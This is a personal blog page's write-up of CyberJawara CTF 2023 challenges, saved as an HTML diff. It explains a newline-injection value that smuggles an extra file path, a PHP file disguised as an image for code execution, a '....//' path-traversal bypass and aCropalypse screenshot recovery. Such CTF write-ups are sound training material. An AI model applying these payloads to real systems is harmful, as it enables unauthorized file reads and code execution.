@@ -1,0 +1,439 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #fbfbfb"
+  lang="en"
+>
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>CyberJawara CTF 2023 - Berlian Gabriel</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="Web Wonder Drive (5 Solves, 850 Points)
+The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file
+if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) we want to add /repository/wonderadmin/flag.txt to access_file, and we can do so by abusing the newline character.
+data[&#39;filepath&#39;] = test..%0a/repository/wonderadmin/flag.txt when the above payload is executed, it will write /repository/wonderadmin/flag." />
+  <meta name="author" content="Berlian Gabriel" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="https://berliangabriel.github.io/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://berliangabriel.github.io/theme.png" />
+
+  
+  
+  
+  
+  
+
+  
+  
+  <link rel="preload" as="image" href="https://berliangabriel.github.io/linkedin.svg" />
+  
+  
+
+  
+  
+  <script
+    defer
+    src="https://berliangabriel.github.io/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+
+  
+  <link rel="icon" href="https://berliangabriel.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://berliangabriel.github.io/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  
+  
+  
+  
+  
+  <meta itemprop="name" content="CyberJawara CTF 2023">
+<meta itemprop="description" content="Web Wonder Drive (5 Solves, 850 Points)
+The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file
+if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) we want to add /repository/wonderadmin/flag.txt to access_file, and we can do so by abusing the newline character.
+data[&#39;filepath&#39;] = test..%0a/repository/wonderadmin/flag.txt when the above payload is executed, it will write /repository/wonderadmin/flag."><meta itemprop="datePublished" content="2023-12-03T19:32:26+07:00" />
+<meta itemprop="dateModified" content="2023-12-03T19:32:26+07:00" />
+<meta itemprop="wordCount" content="909">
+<meta itemprop="keywords" content="" />
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CyberJawara CTF 2023"/>
+<meta name="twitter:description" content="Web Wonder Drive (5 Solves, 850 Points)
+The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file
+if request.method == &#39;POST&#39;: access_file = f&#34;accounts/{username}/access&#34; with open(access_file, &#34;a&#34;, encoding=&#34;ascii&#34;) as f: f.write(f&#34;{data[&#39;filepath&#39;]}\n&#34;) return redirect(url_for(&#39;user_repository_root&#39;, username=username)) we want to add /repository/wonderadmin/flag.txt to access_file, and we can do so by abusing the newline character.
+data[&#39;filepath&#39;] = test..%0a/repository/wonderadmin/flag.txt when the above payload is executed, it will write /repository/wonderadmin/flag."/>
+
+  
+  
+  
+  <link rel="canonical" href="https://berliangabriel.github.io/post/cyberjawara-ctf-2023/" />
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="https://berliangabriel.github.io"
+      >Berlian Gabriel</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#fbfbfb'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/about/"
+        >About</a
+      >
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/contact/"
+        >Contact</a
+      >
+      
+    </nav>
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
+    >
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./linkedin.svg)"
+        href="https://linkedin.com/in/Berlian-Gabriel-Mongkoginta"
+        target="_blank"
+        rel="me"
+      >
+        linkedin
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">CyberJawara CTF 2023</h1>
+
+    
+    <div class="text-sm antialiased opacity-60">
+      
+      <time>Dec 3, 2023</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><h1 id="web">Web</h1>
+<h2 id="wonder-drive">Wonder Drive</h2>
+<p>(5 Solves, 850 Points)</p>
+<p>The code snippet below posses security risks. The idea is to create additional new entry of an arbitrary path to access_file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+        access_file <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;accounts/</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">/access&#34;</span>
+        <span style="color:#66d9ef">with</span> open(access_file, <span style="color:#e6db74">&#34;a&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ascii&#34;</span>) <span style="color:#66d9ef">as</span> f:
+            f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>data[<span style="color:#e6db74">&#39;filepath&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;user_repository_root&#39;</span>, username<span style="color:#f92672">=</span>username))
+</code></pre></div><p>we want to add <code>/repository/wonderadmin/flag.txt</code>  to access_file, and we can do so by abusing the newline character.</p>
+<pre tabindex="0"><code>data['filepath'] = test..%0a/repository/wonderadmin/flag.txt
+</code></pre><p>when the above payload is executed, it will write <code>/repository/wonderadmin/flag.txt</code> to access_file in a new line.</p>
+<pre tabindex="0"><code>repository/test
+repository/wonderadmin/flag.txt
+</code></pre><p>This will allow our user account to access the flag.</p>
+<p>But first thing first, we need to create the following folders and upload the file on our own drive, to make this file path exist
+<code>repository/test..%0arepository/wonderadmin/flag.txt</code></p>
+<p>Once we shared the file and accept_share the token, we can access wonderadmin/flag.txt
+![[Pasted image 20231204032954.png]]</p>
+<p>FLAG: <code>CJ2023{wonderful_trick!_zzzzzzzzzzzzzzzzzzzz}</code></p>
+<h2 id="magic-1">Magic 1</h2>
+<p>(28 Solves, 300 Points)</p>
+<p>The webapp returns <code>Error when doing magic.</code> even for normal image upload, because the imagick cannot access the tmp file due to already being moved to <code>results</code> folder. However, the file is still uploaded, and can be retrieved from the <code>results</code> folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;image&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], <span style="color:#e6db74">&#39;results/original-&#39;</span> <span style="color:#f92672">.</span> $_FILES[<span style="color:#e6db74">&#39;image&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]);
+        $resizedImagePath <span style="color:#f92672">=</span> <span style="color:#a6e22e">resizeImage</span>($_FILES[<span style="color:#e6db74">&#39;image&#39;</span>]);
+</code></pre></div><p>Our approach is to upload a php file, which we will then retrieve from the <code>results</code> folder, and it will get executed and return the content of flag.txt</p>
+<p>payload for php code execution</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;/flag.txt&#39;</span>);
+</code></pre></div><p>Embed the php payload after the image magic bytes to trick the webapp into thinking that the uploaded php file is an image.
+![[Pasted image 20231204013729.png]]</p>
+<p>Execute the php payload by visiting this url path <code>/results/original-{uploaded-filename}.php</code>
+![[Pasted image 20231204012852.png]]
+FLAG: <code>CJ2023{4n0th3r_unrestricted_file_upload__}</code></p>
+<h2 id="static-web">Static Web</h2>
+<p>(63 Solves, 300 Points)</p>
+<p>Given the following index.js source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">http</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;http&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;url&#39;</span>);
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">config</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;./config.js&#39;</span>)
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">server</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">createServer</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;/static/&#39;</span>)) {
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">urlPath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/\.\.\//g</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">filePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#a6e22e">urlPath</span>);
+        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFile</span>(<span style="color:#a6e22e">filePath</span>, (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>) =&gt; {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">404</span>);
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Error: File not found&#34;</span>);
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">200</span>);
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">data</span>);
+            }
+        });
+    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;/admin/&#39;</span>)) {
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsedUrl</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">true</span>); 
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsedUrl</span>.<span style="color:#a6e22e">query</span>;
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">queryObject</span>.<span style="color:#a6e22e">secret</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">secret</span>) {
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">200</span>);
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">flag</span>);
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">403</span>);
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#39;Nope&#39;</span>);
+        }
+    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>) {
+        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFile</span>(<span style="color:#e6db74">&#39;index.html&#39;</span>, (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>) =&gt; {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Error&#34;</span>);
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">200</span>);
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">data</span>);
+            }
+        });
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">404</span>);
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;404: Resource not found&#34;</span>);
+    }
+});
+
+<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Server running at http://localhost:3000/&#34;</span>);
+});
+</code></pre></div><p>Let us first observe the location of the flag, which is inside the <code>config.js</code> file. The intended way this index.js wants us to access the flag is by entering <code>/admin/</code> as the URL path, but we are also required to have the <code>config.secret</code> which we do not know.</p>
+<p>Looking closely at this part of the code, which is intended to perform URL sanitization,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">urlPath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/\.\.\//g</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</code></pre></div><ul>
+<li>The regular expression <code>/\.\.\//g</code> is designed to find all occurrences of the sequence <code>../</code> in the URL path. In regular expressions, <code>.</code> is a special character that matches any character, so it needs to be escaped with a backslash (<code>\</code>) to represent a literal dot. Thus, <code>\.\.</code> matches <code>..</code>. The third <code>/</code> is also matched literally.</li>
+<li>The <code>g</code> at the end of the regular expression is a flag that stands for &ldquo;global&rdquo;. This means the replace operation is applied to all matches in the string, not just the first one.</li>
+<li>The replacement string is <code>''</code>, which indicates that every matched instance of <code>../</code> in the URL is to be replaced with an empty string.</li>
+</ul>
+<p>Notice that the string replacement is NOT performed recursively, meaning that <code>....//</code> will be come <code>../</code>
+Armed with this exploit, we can now perform path traversal to retrieve the content of config.js which contains the flag.</p>
+<p>URL path input:</p>
+<pre tabindex="0"><code>/static/....//config.js
+</code></pre><p>urlPath after sanitation resulting in path traversel:</p>
+<pre tabindex="0"><code>/static/../config.js
+</code></pre><p>![[Pasted image 20231203202524.png]]
+FLAG: <code>CJ2023{1st_warmup_and_m1c_ch3ck}</code></p>
+<h1 id="forensic">Forensic</h1>
+<h2 id="apocalypse">Apocalypse</h2>
+<p>The screenshot is vulnerable to <em>aCropalypse</em> (<em>CVE</em> 2023-21036).
+However, the two screenshots need to be recovered first. The screenshots have missing length and CRC for IHDR, sRGB, sBIT, eXIf, and IDAT. We can compare the screenshots with an actual cropped screenshot to better understand the missing structure.</p>
+<p>The basic idea is to set the length-byte to the right value, and calculate the corresponding CRC.  We can use <code>pngcheck</code> to analyze the CRC and this tool: PCRT (<a href="https://github.com/sherlly/PCRT">GitHub - sherlly/PCRT: PCRT (PNG Check &amp; Repair Tool), a tool to help check and fix the error in a PNG image.</a>) to automate the fixing process.</p>
+<ul>
+<li>The tip is to temporarily substitute the first IEND-byte with something else when using the tool PCRT, to make sure PCRT performs the length and CRC checking until the end of the file.</li>
+<li>IHRC length is set to <code>0D</code></li>
+<li>sRGB length is set to <code>01</code></li>
+<li>sBIT length is set to <code>04</code></li>
+<li>IDAT length is set to <code>0020</code>, except for the IDAT chunk before IEND</li>
+</ul>
+<p>Once all the length-byte and CRC-byte are set properly, the corrupted screenshoots are succesfully recovered.</p>
+<p>We then proceed to use <a href="https://acropalypse.app/">acropalypse</a> to recover the original screenshot before cropping. Judging from the metadata in the screenshot which has <code>Google Inc. 2016</code> in it, and also the width pixel of the two screenshots, we suspect that the device used to take the screenshots were Pixel XL, which was released in 2016 with 2560x1440 pixels. For the device option in acropalypse, we use the custom resolution of 2560x1440. The recovered original screenshots are as follow:</p>
+<p>FLAG: <code>CJ2023{cb2aa1108f6aebb88c30}</code></p>
+</section>
+
+  
+  
+
+  
+  
+  
+  
+  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
+    
+    
+    <a
+      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://berliangabriel.github.io/post/1337up-ctf-2023/"
+      ><span>1337UP CTF 2023</span><span class="ml-1.5">→</span></a
+    >
+    
+  </nav>
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2023
+    <a class="link" href="https://berliangabriel.github.io">Berlian Gabriel</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
